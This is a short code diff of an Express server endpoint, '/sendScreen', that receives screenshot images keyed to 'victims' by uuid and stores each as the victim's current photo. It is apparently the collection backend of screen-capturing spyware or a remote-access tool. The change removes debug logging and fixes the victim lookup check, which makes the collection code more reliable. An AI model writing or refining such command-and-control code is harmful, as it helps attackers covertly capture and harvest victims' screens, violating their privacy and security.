@@ -79,10 +79,8 @@ app.get('/getMyTasks', async (req,res) => {
 
 app.post('/sendScreen', async (req,res) => {
     if (req && req.body && req.body.image && req.body.uuid && req.body.photoId) {
-      console.log(req.body)
       const victim = victims.find(v => v.uuid === req.body.uuid)
-      console.log(victim)
-      if (true) {
+      if (victim) {
         victim.currentPhoto = req.body.image
         console.log('added photo!')
         safeJson(res,req,{'ok': true, 'msg': 'a'},200)
